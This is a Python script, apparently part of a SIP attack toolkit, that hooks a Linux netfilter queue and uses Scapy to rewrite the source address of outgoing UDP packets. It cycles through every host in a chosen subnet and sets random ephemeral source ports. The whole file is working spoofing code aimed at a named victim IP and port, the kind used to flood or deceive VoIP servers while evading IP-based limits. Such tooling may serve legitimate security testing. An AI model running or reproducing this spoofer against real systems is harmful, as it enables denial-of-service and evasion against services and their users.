import random
import signal
import sys
import os
from typing import Optional
from netfilterqueue import NetfilterQueue, Packet
from ipaddress import ip_network, IPv4Network, IPv6Network

from utils.core.logs import print_debug, print_error, print_info, print_success, print_warning, set_verbosity
from scapy.packet import Packet as ScapyPacket
from scapy.layers.inet import IP, UDP
import socket
from types import FrameType

EPHEMERAL_PORTS = range(49152, 65536)

def random_ephemeral_port() -> int:
    """
    Generate a random ephemeral port number.
    
    Returns:
        int: A random port number between 49152 and 65535.
    """
    return random.choice(EPHEMERAL_PORTS)

class Spoofer:
    """Class to handle packet spoofing using iptables and netfilterqueue.
    """
    def __init__(self, attack_queue_num: int, spoofed_subnet: str, victim_port: int = 0, victim_ip: str = "", attacker_port: int = 0):
        self.spoofed_subnet: IPv4Network | IPv6Network = ip_network(spoofed_subnet)  # Format : xxx.xxx.0/24
        self.attack_queue_num: int = attack_queue_num
        self.attacker_port: int = attacker_port
        self.victim_ip: str = victim_ip
        self.victim_port: int = victim_port

        self.next_ip_number: int = 0
        self.spoofed_ips: list[str] = [str(ip) for ip in self.spoofed_subnet.hosts()]  # List of spoofed IPs in the subnet
        self.netfilter_spoofing_queue: Optional[NetfilterQueue] = None
        self.should_stop: bool = False

    def get_spoofed_ip(self) -> str:
        """
        Get the next spoofed IP address from the list.
        Round-robin through the list of spoofed IPs.
        Returns:
            str: The next spoofed IP address.
        """
        ip = self.spoofed_ips[self.next_ip_number]
        # Increment the index for the next call
        self.next_ip_number = (self.next_ip_number + 1) % len(self.spoofed_ips)
        print_debug(f"Get spoofed IP: {ip}")
        return ip
    
    def packet_spoofer(self, packet: Packet) -> None:
        """
        Spoof packets from a specific queue by modifying iptables rules.

        Args:
            packet: The packet object from NetfilterQueue.
        """

        try:
            print(f"Packet received for queue {self.attack_queue_num}: {packet}")
            # Here we modify the packet to spoof the source IP
            pkt: ScapyPacket = IP(packet.get_payload())
            pkt.src = self.get_spoofed_ip()
            pkt[UDP].sport = random_ephemeral_port()
            # We delete the checksums to force Scapy to recalculate them
            del pkt[IP].chksum
            del pkt[UDP].chksum
            packet.set_payload(bytes(pkt))
            packet.accept()  # Accept the modified packet
        except Exception as e:
            print_warning(f"Failed to spoof packet, dropping it: {e}")
            packet.drop()
        finally:
            # Stop condition: if should_stop is set, unbind the queue and exit the thread
            if self.should_stop and self.netfilter_spoofing_queue is not None:
                print_debug("Stopping packet spoofing as per request.")
                self.netfilter_spoofing_queue.unbind()
            print_debug(f"Packet spoofing completed for queue {self.attack_queue_num}.")

    def cleanup(self, signum: int, frame: Optional[FrameType]):
        # Use an async-signal-safe write to avoid reentrant I/O in logging handlers
        try:
            os.write(2, b"Cleanup before exit!\n")
        except Exception:
            # Best-effort only; avoid raising inside a signal handler
            pass
        # Cleanup code
        if self.netfilter_spoofing_queue is not None:
            try:
                self.netfilter_spoofing_queue.unbind()
            except Exception:
                # Ignore unbind errors during shutdown
                pass
        # Use os._exit in a signal handler to avoid reentrant interpreter teardown
        try:
            os._exit(0)
        except Exception:
            # Fallback if os._exit is not available for some reason
            sys.exit(0)

    def send_ready_signal(self):
        print_debug(f"Waiting for spoofer to signal ready on queue {self.attack_queue_num}")
        sock_path = f'/tmp/spoofer_ready_{self.attack_queue_num}.sock'
        client = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        client.sendto(b'ready', sock_path)
        client.close()

if __name__ == "__main__":
    """Main function to run the spoofer."""
    print_info("Starting the SIP Spoofer...")
    if len(sys.argv) < 6:
        print_info("Usage: python spoofer.py [attack_queue_num] [spoofing_subnet] [target_ip] [target_port] [source_port] [verbosity]")
        sys.exit(1)
    
    attack_queue_num = int(sys.argv[1])
    spoofing_subnet = sys.argv[2]
    target_ip = sys.argv[3]
    target_port = int(sys.argv[4])
    source_port = int(sys.argv[5])
    
    # Set verbosity if provided (default to "info" if not provided)
    verbosity = sys.argv[6] if len(sys.argv) > 6 else "info"
    set_verbosity(verbosity)
    print_debug(f"Spoofer verbosity set to: {verbosity}")

    spoofer = Spoofer(
        attack_queue_num=attack_queue_num,
        spoofed_subnet=spoofing_subnet,
        victim_port=target_port,
        victim_ip=target_ip,
        attacker_port=source_port
    )
    print_debug(f"Initialized Spoofer with queue {attack_queue_num}, subnet {spoofing_subnet}, target IP {target_ip}, target port {target_port}, source port {source_port}")
    signal.signal(signal.SIGTERM, spoofer.cleanup)
    signal.signal(signal.SIGINT, spoofer.cleanup)

    try:
        print_debug(f"Starting packet spoofing for queue {attack_queue_num}")
        print_debug(f"sys.argv={repr(sys.argv)}")
        print_debug(f"Parsed attack_queue_num (type={type(attack_queue_num)}): {attack_queue_num!r}")

        netfilter_spoofing_queue = NetfilterQueue()
        # keep reference for cleanup/unbind
        spoofer.netfilter_spoofing_queue = netfilter_spoofing_queue
        print_debug(f"Binding spoofing function to queue {attack_queue_num}")
        try:
            netfilter_spoofing_queue.bind(attack_queue_num, spoofer.packet_spoofer)
            print_debug(f"Successfully bound spoofing function to queue {attack_queue_num}")
        except OSError as oe:
            # Provide detailed diagnostic info to help root-cause the bind failure
            errno = getattr(oe, 'errno', None)
            print_error(f"OSError while binding NFQUEUE {attack_queue_num}: errno={errno} message={oe}")
            # Exit promptly so this failed child doesn't linger
            sys.exit(1)

        spoofer.send_ready_signal()
        netfilter_spoofing_queue.run()
        print_success(f"Started spoofing thread for queue {attack_queue_num}")
    except KeyboardInterrupt:
        print_info("Keyboard interrupt received, stopping spoofing...")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error occurred: {e}")
        sys.exit(1)
    finally:
        print_success("Spoofer cleanup completed.")